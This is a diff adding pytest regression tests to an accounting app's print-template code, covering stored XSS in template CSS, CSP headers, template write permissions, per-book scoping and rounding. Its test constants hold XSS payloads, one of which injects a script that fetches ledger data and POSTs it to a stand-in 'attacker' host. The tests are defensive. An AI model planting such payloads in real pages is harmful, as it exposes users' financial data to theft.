@@ -711,3 +711,366 @@ def test_表格默认有框线():
     html = render_voucher_sheet(tpl, {}, [_voucher()], 1, 1)
     assert 'class="voucher-element table no-border"' not in html
     assert 'class="voucher-element table"' in html
+
+
+# ===================================================================== P0-2 模板存储型 XSS
+#
+# 攻击链四环：
+#   ① font.family / title.align / title.size / subtitle.align / subtitle.size
+#      未经校验直接拼进 _page_css 生成的 <style>；
+#   ② validate_template 只校验纸型/页边距/列 align/line_width/line_style，
+#      上述五处一个都没管；
+#   ③ print_template 没有 book_id —— 模板是全局的；
+#   ④ 打印页只挂 get_my_book，VIEWER 也会渲染这张全局模板。
+#
+# 前两环在这里用**单元测试**钉死（③④ 属于 API 与数据模型层，
+# 见 test_打印模板写权限只认全局门禁）。下面的用例构造真实攻击载荷，
+# 断言它既过不了校验、也进不了渲染结果。
+
+
+#: 审查报告里的原始攻击载荷：闭合 font-family 的引号 → 闭合 style →
+#: 跨出 <style> 执行脚本 → 再开一个 <style> 把文档接回去（看起来完全正常）。
+XSS_FONT_FAMILY = (
+    '宋体"; } </style><script>fetch("/api/books/B/ledger/general?period_id=1")'
+    '.then(r=>r.text()).then(t=>fetch("http://attacker",{method:"POST",body:t}))'
+    '</script><style> body{'
+)
+#: align / size 是**无引号**拼接，比 font-family 更好利用：连闭合引号都不需要。
+XSS_ALIGN = "center; } </style><script>alert(1)</script><style> .x{"
+XSS_SIZE = "16; } </style><script>alert(2)</script><style> .y{"
+
+
+def test_恶意字体名被白名单挡下():
+    tpl = validate_template("VOUCHER", {"font": {"family": XSS_FONT_FAMILY}})
+    assert tpl["font"]["family"] == "宋体"
+
+
+def test_白名单内的字体名照常保留():
+    """不能为了防注入把字体写死 —— 设计器本来就让人选。"""
+    for name in ("黑体", "楷体", "仿宋", "微软雅黑", "Times New Roman"):
+        assert validate_template("VOUCHER", {"font": {"family": name}})["font"]["family"] == name
+
+
+def test_恶意标题对齐被白名单挡下():
+    tpl = validate_template("VOUCHER", {"title": {"align": XSS_ALIGN}})
+    assert tpl["title"]["align"] == "center"
+
+
+def test_恶意标题字号被夹回区间():
+    tpl = validate_template("VOUCHER", {"title": {"size": XSS_SIZE}})
+    assert isinstance(tpl["title"]["size"], float)
+    assert 8 <= tpl["title"]["size"] <= 48
+
+
+def test_恶意副标题对齐和字号被挡下():
+    tpl = validate_template("VOUCHER",
+                            {"subtitle": {"align": XSS_ALIGN, "size": XSS_SIZE}})
+    assert tpl["subtitle"]["align"] == "center"
+    assert 8 <= tpl["subtitle"]["size"] <= 48
+
+
+def test_字号超出区间被夹住():
+    assert validate_template("VOUCHER", {"font": {"size": 9999}})["font"]["size"] == 24
+    assert validate_template("VOUCHER", {"font": {"size": -3}})["font"]["size"] == 6
+
+
+def test_页边距超区间被夹住():
+    """页边距注入不进（float 兜底），但负数/超大值会让整页空白或错位。"""
+    m = validate_template("VOUCHER", {"margins": {"top": -50, "left": 9999}})["margins"]
+    assert m["top"] == 0
+    assert m["left"] == 100
+
+
+def test_元素坐标和线宽不收垃圾值():
+    """元素的 x/y/w/h/line_width 会拼进 style 属性，同样只收区间内的数。"""
+    els = validate_template("VOUCHER", {"elements": [
+        {"type": "line", "x": "nan", "y": "inf", "w": "abc",
+         "line_width": "999", "line_style": "url(evil)"},
+    ]})["elements"]
+    assert els[0]["x"] == 5 and els[0]["y"] == 5      # NaN/Infinity 退回默认
+    assert 1 <= els[0]["w"] <= 100
+    assert els[0]["line_width"] == 3                  # 夹上界
+    assert els[0]["line_style"] == "solid"           # 非白名单退回 solid
+
+
+def test_攻击载荷渲染后不含脚本():
+    """端到端：存进去的恶意模板渲染出来必须没有 <script>。"""
+    tpl = validate_template("VOUCHER", {
+        "font": {"family": XSS_FONT_FAMILY, "size": 10},
+        "title": {"align": XSS_ALIGN, "size": XSS_SIZE},
+        "subtitle": {"align": XSS_ALIGN, "size": XSS_SIZE},
+    })
+    for html in (render_voucher_sheet(tpl, {}, [_voucher()], 1, 1),
+                 render_table_page(tpl, {}, [], 1, 1)):
+        assert "<script" not in html
+        assert "alert(1)" not in html and "alert(2)" not in html
+        assert "fetch(" not in html
+
+
+def test_未校验的脏模板渲染时也不出脚本():
+    """**防御纵深**：模板可能来自校验逻辑上线之前的老数据，或有人直接改库。
+
+    这里**完全绕过 validate_template**，直接把脏字典喂给渲染器：
+    渲染层不能假设自己拿到的字典是干净的。
+    """
+    from app.printing.template import _page_css
+
+    dirty = {
+        "paper": "A4",
+        "margins": {"top": -5, "right": "</style><script>alert(1)</script>"},
+        "font": {"family": XSS_FONT_FAMILY, "size": XSS_SIZE},
+        "title": {"align": XSS_ALIGN, "size": XSS_SIZE},
+        "subtitle": {"align": XSS_ALIGN, "size": XSS_SIZE},
+        "columns": [{"key": "label", "label": "x", "width": 10, "align": "left"}],
+        "body": {},
+    }
+    css = _page_css(dirty)
+    assert "<script" not in css and "</style>" not in css and "alert(" not in css
+
+
+def test_打印页带CSP且禁脚本():
+    """第二道防线：即便载荷绕过校验进了文档，CSP 也不让它执行。
+
+    meta 标签而不是只靠响应头 —— 前端是 axios 取回源码再 srcdoc /
+    document.write，走这条链路时响应头会全部丢失。
+    """
+    tpl = validate_template("VOUCHER", {})
+    for html in (render_voucher_sheet(tpl, {}, [_voucher()], 1, 1),
+                 render_table_page(tpl, {}, [], 1, 1)):
+        assert 'http-equiv="Content-Security-Policy"' in html
+        assert "script-src 'none'" in html
+        assert "style-src 'unsafe-inline'" in html   # 内联样式是模板引擎的固有要求
+
+
+def test_CSP不破坏内联样式和打印():
+    """CSP 不能把版式打掉：内联 <style> 必须仍被放行。"""
+    tpl = validate_template("VOUCHER", {"font": {"family": "黑体", "size": 12}})
+    html = render_voucher_sheet(tpl, {}, [_voucher()], 1, 1)
+    assert "<style>" in html and "@page" in html
+    assert "黑体" in html
+
+
+# ------------------------------------------------------------ P1-5 全局模板写门禁
+
+
+def _create_template(client, headers, book_id, **kw):
+    body = {"scope": "VOUCHER", "name": "模板", "content": {}}
+    body.update(kw)
+    return client.post(f"/api/books/{book_id}/print/templates", json=body, headers=headers)
+
+
+def test_会计不能改全局打印模板(client, db, book, plain_user, plain_auth):
+    """模板是全局的，写门禁不能只看「当前账套能不能写」。
+
+    过去只挂 require_book_write，于是在 A 账套是会计的人能改掉
+    **B 账套只读用户正在渲染的**默认模板 —— 这正是 P0-2 的爆炸半径。
+    """
+    from app.models import UserBook
+
+    db.add(UserBook(user_id=plain_user.id, book_id=book.id, role="ACCOUNTANT"))
+    db.commit()
+    r = _create_template(client, plain_auth, book.id)
+    assert r.status_code == 403, f"会计竟然能改全局模板：{r.status_code} {r.text}"
+
+
+def test_负责人和管理员仍能改全局模板(client, db, book, plain_user, plain_auth, auth):
+    """收紧不能把账锁死：OWNER 与管理员必须还能改。"""
+    from app.models import UserBook
+
+    db.add(UserBook(user_id=plain_user.id, book_id=book.id, role="OWNER"))
+    db.commit()
+    assert _create_template(client, plain_auth, book.id).status_code == 201
+
+    r = client.post(f"/api/books/{book.id}/print/templates",
+                    json={"scope": "VOUCHER", "name": "管理员模板", "content": {}},
+                    headers=auth)
+    assert r.status_code == 201, r.text
+
+
+def test_会计改不了已有全局模板(client, db, book, plain_user, plain_auth, auth):
+    """PUT / DELETE / copy 三条写路径同样要挡。"""
+    from app.models import UserBook
+
+    created = _create_template(client, auth, book.id)
+    assert created.status_code == 201
+    tid = created.json()["id"]
+
+    db.add(UserBook(user_id=plain_user.id, book_id=book.id, role="ACCOUNTANT"))
+    db.commit()
+    for method, path in (
+        ("put", f"/api/books/{book.id}/print/templates/{tid}"),
+        ("delete", f"/api/books/{book.id}/print/templates/{tid}"),
+        ("post", f"/api/books/{book.id}/print/templates/{tid}/copy"),
+    ):
+        r = client.request(method, path, json={"content": {}}, headers=plain_auth)
+        assert r.status_code == 403, f"{method} {path} -> {r.status_code}"
+
+
+# ------------------------------------------------------------ P1-22 舍入模式一致性
+
+
+@pytest.mark.parametrize(
+    "raw,want",
+    [
+        # 与 accounting/util.py::money（ROUND_HALF_UP）对齐。
+        # 用默认的 ROUND_HALF_EVEN 会得到 0.12 / 1.00，与账上的 0.13 / 1.01 对不上：
+        # 小写合计写 0.13、大写印「壹角贰分」，同一张凭证自相矛盾。
+        ("0.125", "零元壹角叁分"),
+        ("1.005", "壹元零角壹分"),
+        ("-0.005", "负零元壹分"),
+        ("2.675", "贰元陆角捌分"),
+    ],
+)
+def test_大写金额用四舍五入而不是银行家舍入(raw, want):
+    assert to_cn_capital(raw) == want
+
+# ------------------------------------------------ P1-5 模板作用域接线（book_id）
+#
+# 迁移（0005/0007）给 ``print_template`` 加了 ``book_id``（NULL = 全局兜底），
+# 但在那之前 ``_template`` 取的是「该 scope 下**最早创建**的默认模板」，
+# 不管它属于谁：一张全局模板会流进每一个账套的打印页。这组用例钉的是
+# 「本账套优先、全局兜底」这条取用口径，以及跨账套按 id 取用/写入被拒。
+#
+# 断言方式刻意选在**渲染结果**上，而不是直接查 ``_template`` 返回了哪一行：
+# 直接断言会让用例与实现耦合，而「这个账套打出来的到底是哪张模板」才是
+# 真正要紧的那件事（模板内容会进 ``<style>``，见 P0-2）。
+
+
+def _mk_book_as(client, headers, name=None) -> int:
+    # 名字必须每次不同：走接口建的账套是**提交**的，夹具的 rollback 撤不回来，
+    # 固定名字会在同一套件里撞上「同名账套已存在」。
+    import uuid
+
+    name = name or f"作用域{uuid.uuid4().hex[:8]}"
+    r = client.post("/api/books", headers=headers,
+                    json={"company_name": name, "name": name, "start_year": 2026})
+    assert r.status_code == 201, r.text
+    return r.json()["id"]
+
+
+def _mk_template(db, *, book_id, scope, name, title, is_default=True) -> int:
+    """造一条默认模板并返回 id。``title`` 会出现在 ``<h1 class="doc-title">`` 里，
+    用来反查「打出来的到底是哪一张」。
+
+    ``book_id=None`` 就是「全局兜底」——迁移之前的存量数据全是这个形状。
+    """
+    from app.models import PrintTemplate
+    from app.printing.template import validate_template
+
+    content = validate_template(scope, {"title": {"text": title}})
+    t = PrintTemplate(book_id=book_id, scope=scope, name=name,
+                      paper=content.get("paper", "A4"), content=content,
+                      is_default=is_default)
+    db.add(t)
+    db.commit()
+    db.refresh(t)
+    return t.id
+
+
+def _printed(client, headers, book_id) -> str:
+    r = client.get(f"/api/books/{book_id}/print/balance.html", headers=headers)
+    assert r.status_code == 200, r.text
+    return r.text
+
+
+def test_本账套模板优先_全局模板只做兜底(client, db, auth, book):
+    """两个账套各有各的默认模板，各打各的；全局的那张谁也不取。
+
+    特意让全局模板的 id **最小** —— 旧口径「最早创建的默认模板」在这种数据
+    下必然取错，两张本账套的都会被它顶掉。
+    """
+    other = _mk_book_as(client, auth)
+    glob = _mk_template(db, book_id=None, scope="BALANCE", name="全局版式",
+                        title="GLOBAL-TPL")
+    mine = _mk_template(db, book_id=book.id, scope="BALANCE", name="A 版式",
+                        title="BOOK-A-TPL")
+    theirs = _mk_template(db, book_id=other, scope="BALANCE", name="B 版式",
+                          title="BOOK-B-TPL")
+    assert glob < min(mine, theirs), "全局模板必须是 id 最大的那条才对，旧口径才取不到"
+
+    a = _printed(client, auth, book.id)
+    assert "BOOK-A-TPL" in a and "GLOBAL-TPL" not in a, "A 账套取的不是自己的默认模板"
+    b = _printed(client, auth, other)
+    assert "BOOK-B-TPL" in b and "GLOBAL-TPL" not in b, "B 账套取的不是自己的默认模板"
+
+
+def test_只有全局模板的老数据_仍然打得出来(client, db, auth, book):
+    """迁移前的存量模板全是 ``book_id IS NULL``：它必须继续能用。
+
+    升级不能把老账套的版式弄丢 —— 所以它是「兜底」而不是「废弃」。
+    但一旦本账套有了自己的默认模板，就轮不到它了。
+    """
+    _mk_template(db, book_id=None, scope="BALANCE", name="全局版式", title="GLOBAL-TPL")
+    assert "GLOBAL-TPL" in _printed(client, auth, book.id)
+
+    _mk_template(db, book_id=book.id, scope="BALANCE", name="A 版式", title="BOOK-A-TPL")
+    assert "BOOK-A-TPL" in _printed(client, auth, book.id)
+
+
+def test_跨账套的模板按_id_取不到(client, db, auth, book):
+    """``template_id`` 是前端传来的任意整数，**不是授权凭据**。"""
+    other = _mk_book_as(client, auth)
+    theirs = _mk_template(db, book_id=other, scope="BALANCE", name="B 版式",
+                          title="BOOK-B-TPL")
+
+    r = client.get(f"/api/books/{book.id}/print/balance.html?template_id={theirs}",
+                   headers=auth)
+    assert r.status_code == 404, f"拿着别的账套的模板 id 打出了东西：{r.status_code}"
+
+    d = client.get(f"/api/books/{book.id}/print/templates/{theirs}", headers=auth)
+    assert d.status_code == 404, d.text
+
+
+def test_跨账套改不了别人的模板(client, db, auth, book):
+    """写路径同样要按账套收 —— 否则 book_id 只是个摆设。"""
+    other = _mk_book_as(client, auth)
+    theirs = _mk_template(db, book_id=other, scope="BALANCE", name="B 版式",
+                          title="BOOK-B-TPL")
+
+    for method, path in (
+        ("put", f"/api/books/{book.id}/print/templates/{theirs}"),
+        ("delete", f"/api/books/{book.id}/print/templates/{theirs}"),
+        ("post", f"/api/books/{book.id}/print/templates/{theirs}/copy"),
+    ):
+        r = client.request(method, path, json={"name": "被改了"}, headers=auth)
+        assert r.status_code == 404, f"{method} {path} -> {r.status_code}"
+
+    still = client.get(f"/api/books/{other}/print/templates/{theirs}", headers=auth)
+    assert still.status_code == 200 and still.json()["name"] == "B 版式"
+
+
+def test_新建的模板归属当前账套(client, db, auth, book):
+    from app.models import PrintTemplate
+
+    r = client.post(f"/api/books/{book.id}/print/templates", headers=auth,
+                    json={"scope": "BALANCE", "name": "新建", "content": {}})
+    assert r.status_code == 201, r.text
+    t = db.get(PrintTemplate, r.json()["id"])
+    assert t is not None and t.book_id == book.id, "新建的模板没有归属到账套"
+
+
+def test_设为默认_不会清掉别的账套的默认模板(client, db, auth, book):
+    """``_clear_other_defaults`` 必须按 ``(book_id, scope)`` 分组。
+
+    旧实现只按 scope 清，于是 A 账套「设为默认」会把 B 账套的默认模板一起
+    降级 —— 表现是「在 A 账套点一下，B 账套的版式就悄悄变回去了」。
+    """
+    from app.models import PrintTemplate
+
+    other = _mk_book_as(client, auth)
+    old = _mk_template(db, book_id=book.id, scope="BALANCE", name="A 旧默认",
+                       title="BOOK-A-OLD")
+    theirs = _mk_template(db, book_id=other, scope="BALANCE", name="B 默认",
+                          title="BOOK-B-TPL")
+
+    r = client.put(f"/api/books/{book.id}/print/templates/{old}", headers=auth,
+                   json={"is_default": False})
+    assert r.status_code == 200, r.text
+    _mk_template(db, book_id=book.id, scope="BALANCE", name="A 新默认", title="BOOK-A-NEW")
+
+    db.expire_all()
+    b = _printed(client, auth, other)
+    assert "BOOK-B-TPL" in b, "A 账套「设为默认」把 B 账套的默认模板一起清掉了"
+    a = _printed(client, auth, book.id)
+    assert "BOOK-A-NEW" in a
+    assert db.get(PrintTemplate, theirs).is_default is True
